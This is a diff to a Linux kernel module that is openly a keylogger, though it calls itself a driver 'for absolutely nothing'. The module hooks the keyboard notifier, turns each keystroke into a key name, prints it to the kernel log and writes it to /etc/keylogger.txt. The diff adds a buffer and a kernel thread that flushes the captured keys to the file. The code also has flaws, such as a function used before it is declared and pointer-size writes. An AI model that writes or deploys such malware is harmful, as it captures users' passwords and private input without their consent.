@@ -5,6 +5,12 @@
 #include <linux/semaphore.h>
 #include "VictorSwagHeaders.h"
 
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/kthread.h>  // for threads
+#include <linux/time.h>   // for using jiffies 
+#include <linux/timer.h>
+
 #define DRIVER_DESC     "Keylogger"
 #define fullFileName    "/etc/keylogger.txt"
 
@@ -14,10 +20,15 @@ MODULE_DESCRIPTION("Linux device driver for absolutely nothing ;) ;)");
 MODULE_VERSION("1.0");
 
 struct semaphore sem;
+static struct task_struct *thread1;
 
 void WriteToFile(char*, size_t);
 int setup_disk(void);
 ssize_t write_vaddr_disk(void *, size_t);
+
+int index_num = 0;
+int buffer_counter = 0;
+static char* buffer[100];
 
 static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                         "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
@@ -42,6 +53,43 @@ static const char* YesShift[] =
 
 static int UnpressedKey = 0;
 
+void thread_cleanup(void) {
+ int ret;
+ ret = kthread_stop(thread1);
+ if(!ret)
+  printk(KERN_INFO "Thread stopped");
+
+}
+
+int thread_init (void) {
+   
+    const char * our_thread = "thread1";
+    printk(KERN_INFO "in init");
+    thread1 = kthread_create(thread_fn, NULL, our_thread);
+    if((thread1))
+    {
+        printk(KERN_INFO "in if");
+        wake_up_process(thread1);
+    }
+
+    return 0;
+}
+
+int thread_fn(void * data) {
+
+    printk(KERN_INFO "Thread started");
+    index_num = 0;
+    while(index_num < 100){
+        WriteToFile(buffer[index_num], sizeof(buffer[index_num]));
+        index_num++;
+    }
+
+    thread_cleanup();
+
+    return 0;
+}
+
+
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
@@ -63,17 +111,25 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
         {
             down(&sem);
             if(UnpressedKey == 0){
-                WriteToFile((char *)NoShift[param->value], sizeof(*NoShift[param->value]));
+                // WriteToFile((char *)NoShift[param->value], sizeof(*NoShift[param->value]));
+                buffer[buffer_counter] = (char *)NoShift[param->value];
+                buffer_counter++;
                 printk(KERN_INFO "%s \n", NoShift[param->value]);
             }
             else{
-                WriteToFile((char *)YesShift[param->value], sizeof(*YesShift[param->value]));
+                // WriteToFile((char *)YesShift[param->value], sizeof(*YesShift[param->value]));
+                buffer[buffer_counter] = (char *)YesShift[param->value];
+                buffer_counter++;
                 printk(KERN_INFO "%s \n", YesShift[param->value]);
             }
             up(&sem);
         }
+        
+        if(buffer_counter == 100){
+            thread_init();
+            buffer_counter = 0;
+        }
     }
-
     return NOTIFY_OK;
 }
 
